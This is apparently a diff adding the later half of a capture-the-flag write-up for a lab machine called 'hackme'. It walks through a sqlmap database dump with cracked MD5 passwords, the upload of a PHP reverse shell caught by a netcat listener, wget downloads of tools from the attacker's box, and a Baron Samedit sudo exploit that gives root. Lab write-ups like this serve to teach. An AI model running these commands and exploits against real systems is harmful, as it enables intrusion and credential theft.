@@ -128,3 +128,226 @@ back-end DBMS: MySQL >= 5.0.12
 
 [*] ending @ 13:52:35 /2022-07-13/
 ```
+
+We can now start exfiltrating data.
+
+Through various queries, I finally retrieve a list of usernames and MD5-hashed passwords that I can easily crack and obtain.
+
+```
+$ sudo sqlmap -r hackme -D webapphacking -T users -C user,pasword --dump
+...
+
+[13:53:35] [INFO] fetching entries of column(s) '`user`,pasword' for table 'users' in database 'webapphacking'
+[13:53:35] [INFO] recognized possible password hashes in column 'pasword'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+do you want to crack them via a dictionary-based attack? [Y/n/q] 
+[13:53:37] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[13:53:37] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] 
+[13:53:39] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[13:53:39] [INFO] starting 16 processes 
+[13:53:40] [INFO] cracked password 'commando' for hash '6269c4f71a55b24bad0f0267d9be5508'
+[13:53:41] [INFO] cracked password 'hello' for hash '5d41402abc4b2a76b9719d911017c592'
+[13:53:42] [INFO] cracked password 'p@ssw0rd' for hash '0f359740bd1cda994f8b55330c86d845'
+[13:53:43] [INFO] cracked password 'testtest' for hash '05a671c66aefea124cc08b76ea6d30bb'
+Database: webapphacking
+Table: users
+[7 entries]
++------------+---------------------------------------------+
+| user       | pasword                                     |
++------------+---------------------------------------------+
+| user1      | 5d41402abc4b2a76b9719d911017c592 (hello)    |
+| user2      | 6269c4f71a55b24bad0f0267d9be5508 (commando) |
+| user3      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |
+| test       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
+| superadmin | 2386acb2cf356944177746fc92523983            |
+| test1      | 05a671c66aefea124cc08b76ea6d30bb (testtest) |
+| meowmycks  | 282e0ac5b5b2822b50a2edf2384b309b            |
++------------+---------------------------------------------+
+
+[13:53:44] [INFO] table 'webapphacking.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.57.138/dump/webapphacking/users.csv'
+[13:53:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.57.138'
+
+[*] ending @ 13:53:44 /2022-07-13/
+```
+
+The password for ```superadmin``` wasn't cracked using SQLmap's default wordlist, but throwing the hash into Crackstation revealed the password to simply be ```Uncrackable```. Smart.
+
+![image](https://user-images.githubusercontent.com/45502375/179264143-a05445ab-53bf-425f-81c5-77efb7577615.png)
+
+Logging out of my own account and logging in with the credentials ```superadmin:Uncrackable``` reveals a file uploading page called ```welcomeadmin.php```.
+
+The very first thing I try is directly uploading a PHP reverse shell script, which surprisingly works. It even tells me that it's in the uploads folder.
+
+So I start up a Netcat listener on port 4444...
+
+```
+$ sudo nc -lvnp 4444    
+listening on [any] 4444 ...
+```
+
+...and request my script at ```http://192.168.57.138/uploads/catshell.php```...
+
+```
+GET /uploads/catshell.php HTTP/1.1
+Host: 192.168.57.138
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=f5truacndojsv5e8o3pr106dlp
+Upgrade-Insecure-Requests: 1
+```
+
+...and I receive a connection from the target.
+
+```
+connect to [192.168.57.129] from (UNKNOWN) [192.168.57.138] 41742
+Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 17:55:09 up 7 min,  0 users,  load average: 0.00, 0.07, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
+## Step 3 - Privilege Escalation
+
+Now that I had a foothold in the server, I could focus on upgrading to root.
+
+The first thing I did was upgrade to a TTY shell and start an HTTP server on my Kali box with Python using the command ```sudo python3 -m http.server 80```.
+
+Doing this would allow me to download my scripts from the target machine using ```wget``` requests.
+
+```
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@hackme:/$ ^Z
+zsh: suspended  sudo nc -lvnp 4444
+                                                                                                                                                                                                                                            
+┌──(meowmycks㉿catBook)-[~]
+└─$ stty raw -echo;fg 
+[1]  + continued  sudo nc -lvnp 4444
+
+
+www-data@hackme:/$ export TERM=xterm
+```
+```
+$ sudo python3 -m http.server 80                    
+[sudo] password for meowmycks: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+I then attempted to download a local copy of Linux Smart Enumeration (LSE) onto the target machine.
+
+```
+www-data@hackme:/var/www$ wget http://192.168.57.129/lse.tar
+```
+
+However, I was denied permission to do so. 
+
+```
+--2022-07-13 17:55:52--  http://192.168.57.129/lse.tar
+Connecting to 192.168.57.129:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 24565760 (23M) [application/x-tar]
+lse.tar: Permission denied
+
+Cannot write to 'lse.tar' (Permission denied).
+```
+
+Figuring I didn't have write permissions in the user's home folder, which was really ```/var/www/``` since I was working under the web server's account, I went to the ```/tmp``` folder instead. Attempts to download files here were successful.
+
+```
+www-data@hackme:/var/www$ cd /tmp
+cd /tmp
+www-data@hackme:/tmp$ wget http://192.168.57.129/lse.tar
+wget http://192.168.57.129/lse.tar
+--2022-07-13 17:56:04--  http://192.168.57.129/lse.tar
+Connecting to 192.168.57.129:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 24565760 (23M) [application/x-tar]
+Saving to: 'lse.tar'
+
+lse.tar             100%[===================>]  23.43M  --.-KB/s    in 0.08s   
+
+2022-07-13 17:56:04 (288 MB/s) - 'lse.tar' saved [24565760/24565760]
+```
+
+After decompressing and extracting the folder, I ran the enumeration script to reveal potential opportunities for privilege escalation.
+
+Crucially, it found known vulnerabilities on the machine.
+
+```
+===================================================================( CVEs )=====                                                                                                                                                            
+[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
+[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
+---
+Vulnerable! sudo version: 1.8.23
+---
+[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
+[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
+---
+Vulnerable!
+---
+[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
+[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope
+
+==================================( FINISHED )==================================
+```
+
+LSE revealed that the machine was vulnerable to the Sudo Baron Samedit exploit and the PwnKit exploit.
+
+For situations like this, I went out of my way to package custom exploits that could take advantage of any found known vulnerabilities.
+
+Therefore, all I had to do was find the right one to use. In this case, I chose to use the Sudo Baron Samedit exploit, since there were several different variations I could use in case one or multiple failed. It's also my favorite one purely because of the exploit's name.
+
+```
+www-data@hackme:/tmp/lse$ cd exploits   
+cd exploits
+www-data@hackme:/tmp/lse/exploits$ ls
+ls
+netfilter  polkit.tar  pwnkit  sudobaron.tar
+www-data@hackme:/tmp/lse/exploits$ tar xf sudobaron.tar
+tar xf sudobaron.tar
+www-data@hackme:/tmp/lse/exploits$ cd sudobaron
+cd sudobaron
+www-data@hackme:/tmp/lse/exploits/sudobaron$ ls
+ls
+LICENSE                     exploit_nss.py         exploit_timestamp_race.c
+README.md                   exploit_nss_d9.py      exploit_userspec.py
+asm                         exploit_nss_manual.py  gdb
+exploit_cent7_userspec.py   exploit_nss_u14.py
+exploit_defaults_mailer.py  exploit_nss_u16.py
+```
+
+Fortunately after waiting for a few seconds, it worked on the first try with the ```exploit_nss.py``` script, allowing me to become root.
+
+```
+www-data@hackme:/tmp/lse/exploits/sudobaron$ python3 exploit_nss.py
+python3 exploit_nss.py
+# whoami
+whoami
+root
+```
+
+All I had to do now was get the flag...
+
+...But there wasn't one, so I just made my own.
+
+```
+# echo "alright whatever gg i win"
+alright whatever gg i win
+```
+
+## Conclusion
+
+While this was certainly not the first web application CTF I've worked on, this was the first one where SQL injection was required to advance.
+
+I don't normally work with SQLi or XSS, so it's nice to see it being used. Other times I've just used webapps like *DVWA* or *bWAPP* to get exposure, so to see it implemented in an (arguably) more real situation was cool.
